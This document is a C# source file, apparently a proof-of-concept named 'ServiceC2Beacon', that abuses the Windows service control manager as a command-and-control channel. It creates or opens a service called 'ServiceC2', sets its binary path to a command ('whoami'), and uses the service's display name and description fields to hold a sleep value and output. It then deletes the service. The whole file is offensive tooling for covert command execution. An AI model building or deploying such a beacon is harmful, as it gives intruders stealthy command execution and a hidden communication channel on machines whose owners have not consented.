using System;
using System.Collections.Generic;
using System.Management;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace ServiceC2Beacon
{
    internal class Program
    {

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateServiceA(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, [Optional] string lpLoadOrderGroup, [Optional] string lpdwTagId, [Optional] string lpDependencies, [Optional] string lpServiceStartName, [Optional] string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [StructLayout(LayoutKind.Sequential)]
        internal struct SERVICE_DESCRIPTION
        {
            public string lpDescription;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct QUERY_SERVICE_CONFIG
        {
            public int serviceType;
            public int startType;
            public int errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        public bool CreateService()
        {
            return true;
        }

        static void Main(string[] args)
        {
            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed to get SCM handle: ");
                return;
                
            }
            Console.WriteLine("\t[+] OpenSCManager [OK]: " + SCMHandle.ToString());

            IntPtr schService = OpenService(SCMHandle, "ServiceC2", 0xF01FF);
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed to get sch pointer... ");
                if (schService == IntPtr.Zero)
                {
                    Console.WriteLine("\t[*] Creating service...");
                    schService = CreateServiceA(SCMHandle, "ServiceC2", "30", 0xF003F, 0x00000010, 0x00000004, 0x00000000, "whoami", null, null, null, null, null);
                    if (schService == IntPtr.Zero)
                    {
                        Console.WriteLine("\t[-] Failed to create service...");
                        return;
                    } else
                    {
                        Console.WriteLine("\t[+] Service created successfully");
                    }
                }
            }

            Console.WriteLine("\t[+] OpenService [OK]:" + schService.ToString());

            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, "whoami", null, null, null, null, null, null);
            if (!success)
            {
                Console.WriteLine("\t[-] Failed to Change");
                
            }
            Console.WriteLine("\t[+] ChangeServiceConfigA [OK]");


            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();

            service_descriptiona.lpDescription = "Output field";
            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
            if (sdinfo == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed marshalling");
                
            }

            Marshal.StructureToPtr(service_descriptiona, sdinfo, false); success = ChangeServiceConfig2(schService, 1, sdinfo);

            if (!success)
            {
                Console.WriteLine("\t[-] ChangeServiceConfig2 failed");
            }
            Console.WriteLine("\t[+] ChangeServiceConfig2 [OK]");


            QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();

            uint dwBytesNeeded = 0;
            QueryServiceConfigA(schService, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
            Console.WriteLine("Bytes needed: " + dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            bool result = QueryServiceConfigA(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            if (result)
            {
                service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
                //Marshal.PtrToStructure(ptr, service_config);
                Console.WriteLine("cmd: " + Marshal.PtrToStringAnsi(service_config.binaryPathName));
                Console.WriteLine("User running: " + Marshal.PtrToStringAnsi(service_config.startName));
                Console.WriteLine("sleep: " + Marshal.PtrToStringAnsi(service_config.displayName));


            }
            Marshal.FreeHGlobal(ptr);

            using (ManagementObject service = new ManagementObject(new ManagementPath(string.Format("Win32_Service.Name='{0}'", "ServiceC2"))))
            {
                Console.WriteLine("Output: " + service["Description"].ToString());
            }

            DeleteService(schService);

            CloseServiceHandle(schService);
        }
    }
}
